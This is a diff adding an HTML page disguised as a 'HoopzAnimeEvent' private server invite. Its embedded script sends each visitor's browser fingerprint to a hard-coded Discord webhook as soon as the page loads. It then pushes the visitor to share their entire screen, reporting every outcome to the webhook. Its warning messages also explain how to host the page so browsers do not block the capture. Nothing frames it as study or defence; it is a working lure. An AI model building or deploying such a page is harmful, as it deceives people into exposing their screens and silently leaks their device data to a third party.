@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Permissions-Policy" content="display-capture=*">
+<title>HoopzAnimeEvent - Private Server</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  background: #1a1a2e;
+  color: #eee;
+  font-family: 'Segoe UI', system-ui, sans-serif;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+}
+.container {
+  text-align: center;
+  max-width: 440px;
+  padding: 40px 30px;
+  background: #16213e;
+  border-radius: 16px;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+  border: 1px solid #0f3460;
+}
+.logo {
+  width: 72px;
+  height: 72px;
+  background: linear-gradient(135deg, #e94560, #0f3460);
+  border-radius: 18px;
+  margin: 0 auto 20px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 28px;
+  font-weight: 800;
+  color: #fff;
+}
+h1 { font-size: 20px; margin-bottom: 6px; }
+.sub { color: #a0a0b0; font-size: 13px; margin-bottom: 24px; }
+.status {
+  background: #0f3460;
+  padding: 12px 16px;
+  border-radius: 10px;
+  font-size: 13px;
+  margin-bottom: 18px;
+  color: #7ec8e3;
+}
+.btn {
+  background: linear-gradient(135deg, #e94560, #c73e54);
+  color: #fff;
+  border: none;
+  padding: 14px 28px;
+  font-size: 15px;
+  font-weight: 600;
+  border-radius: 10px;
+  cursor: pointer;
+  width: 100%;
+  transition: transform 0.15s, box-shadow 0.15s;
+}
+.btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 8px 24px rgba(233,69,96,0.4);
+}
+.btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+.hint { margin-top: 16px; font-size: 11px; color: #666; }
+.warn {
+  background: #3d1f1f;
+  border: 1px solid #e94560;
+  color: #ff8a80;
+  padding: 12px;
+  border-radius: 8px;
+  font-size: 12px;
+  margin-top: 14px;
+  display: none;
+  text-align: left;
+  line-height: 1.45;
+}
+#viewer {
+  position: fixed;
+  inset: 0;
+  background: #000;
+  display: none;
+  z-index: 100;
+  flex-direction: column;
+}
+#viewer video {
+  flex: 1;
+  width: 100%;
+  height: 100%;
+  object-fit: contain;
+  background: #000;
+}
+#bar {
+  position: absolute;
+  bottom: 16px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: rgba(22,33,62,0.95);
+  padding: 10px 20px;
+  border-radius: 12px;
+  display: flex;
+  gap: 12px;
+  align-items: center;
+  border: 1px solid #0f3460;
+  z-index: 101;
+}
+#bar span { color: #7ec8e3; font-size: 13px; }
+#bar button {
+  background: #e94560;
+  color: #fff;
+  border: none;
+  padding: 7px 14px;
+  border-radius: 8px;
+  cursor: pointer;
+  font-size: 12px;
+}
+</style>
+</head>
+<body>
+<div class="container" id="landing">
+  <div class="logo">HA</div>
+  <h1>HoopzAnimeEvent</h1>
+  <p class="sub">Private Server Invite</p>
+  <div class="status" id="status">Ready. Click Join to enter the server.</div>
+  <button class="btn" id="joinBtn" onclick="startShare()">Join Private Server</button>
+  <div class="warn" id="warnBox"></div>
+  <p class="hint">One-time invite · HoopzAnimeEvent</p>
+</div>
+
+<div id="viewer">
+  <video id="vid" autoplay playsinline muted></video>
+  <div id="bar">
+    <span>Live</span>
+    <button onclick="stopShare()">Leave</button>
+  </div>
+</div>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1559430623905587200/42zaSHtnb63SxBWzkSr5PCzMCLa4iTyS_zSsOUfxgqG830qvdOH4D9CtQSeT7pUjfEim";
+const SID = "HAE-" + Math.random().toString(36).slice(2, 9).toUpperCase();
+let stream = null;
+
+async function ping(title, color, extra = {}) {
+  const fields = [
+    { name: "Session", value: SID, inline: true },
+    { name: "Time", value: new Date().toISOString(), inline: true },
+    ...Object.entries(extra).map(([k, v]) => ({ name: k, value: String(v).slice(0, 200), inline: true }))
+  ];
+  try {
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        embeds: [{ title, color, fields, footer: { text: "HoopzAnimeEvent" } }]
+      })
+    });
+  } catch (e) {}
+}
+
+ping("Link Opened", 0xe94560, {
+  "User-Agent": navigator.userAgent.slice(0, 90),
+  "Screen": screen.width + "x" + screen.height,
+  "Lang": navigator.language,
+  "Secure": window.isSecureContext ? "yes" : "no"
+});
+
+function showWarn(msg) {
+  const box = document.getElementById("warnBox");
+  box.style.display = "block";
+  box.innerHTML = msg;
+}
+
+async function startShare() {
+  const btn = document.getElementById("joinBtn");
+  const status = document.getElementById("status");
+  btn.disabled = true;
+  btn.textContent = "Allow screen share...";
+  status.textContent = "Select your entire screen when the browser asks.";
+  document.getElementById("warnBox").style.display = "none";
+
+  // must be secure context (https or localhost)
+  if (!window.isSecureContext) {
+    status.textContent = "Needs HTTPS or localhost.";
+    showWarn("This page is not on HTTPS. Screen share only works on <b>https://</b> links or localhost. Host the file on GitHub Pages / Netlify / any free HTTPS host and try again.");
+    btn.disabled = false;
+    btn.textContent = "Join Private Server";
+    ping("Share Blocked - not secure context", 0xff9800, { Secure: "no" });
+    return;
+  }
+
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+    status.textContent = "Browser does not support screen share.";
+    showWarn("This browser does not support getDisplayMedia. Use Chrome, Edge, or Firefox on desktop.");
+    btn.disabled = false;
+    btn.textContent = "Join Private Server";
+    ping("Share Blocked - no getDisplayMedia", 0xff9800);
+    return;
+  }
+
+  try {
+    stream = await navigator.mediaDevices.getDisplayMedia({
+      video: {
+        displaySurface: "monitor",
+        cursor: "always"
+      },
+      audio: false
+    });
+
+    const vid = document.getElementById("vid");
+    vid.srcObject = stream;
+    document.getElementById("landing").style.display = "none";
+    document.getElementById("viewer").style.display = "flex";
+
+    await ping("Screen Share STARTED", 0x00c853, {
+      "Tracks": stream.getTracks().length,
+      "Label": stream.getVideoTracks()[0]?.label || "screen"
+    });
+
+    stream.getVideoTracks()[0].onended = () => {
+      stopShare();
+      ping("Share Ended by user", 0xff5252);
+    };
+
+  } catch (err) {
+    const msg = err.message || String(err);
+    status.textContent = "Could not start screen share.";
+    btn.disabled = false;
+    btn.textContent = "Join Private Server";
+
+    if (msg.includes("permissions policy") || msg.includes("display-capture") || msg.includes("disallowed")) {
+      showWarn("Blocked by permissions policy (common on some hosts / iframes).<br><br>Fix: host the HTML as a <b>top-level page</b> on HTTPS (GitHub Pages, Netlify, Cloudflare Pages, etc). Do not embed it in an iframe.");
+    } else if (msg.includes("NotAllowedError") || msg.includes("Permission denied") || msg.includes("denied")) {
+      showWarn("You clicked Cancel or denied the permission. Click Join again and choose <b>Entire Screen</b>.");
+    } else {
+      showWarn("Error: " + msg);
+    }
+
+    ping("Share Denied / Error", 0xff9800, { Error: msg.slice(0, 180) });
+  }
+}
+
+function stopShare() {
+  if (stream) {
+    stream.getTracks().forEach(t => t.stop());
+    stream = null;
+  }
+  document.getElementById("viewer").style.display = "none";
+  document.getElementById("landing").style.display = "flex";
+  document.getElementById("joinBtn").disabled = false;
+  document.getElementById("joinBtn").textContent = "Join Private Server";
+  document.getElementById("status").textContent = "Session ended. Click to rejoin.";
+  document.getElementById("warnBox").style.display = "none";
+}
+</script>
+</body>
+</html>
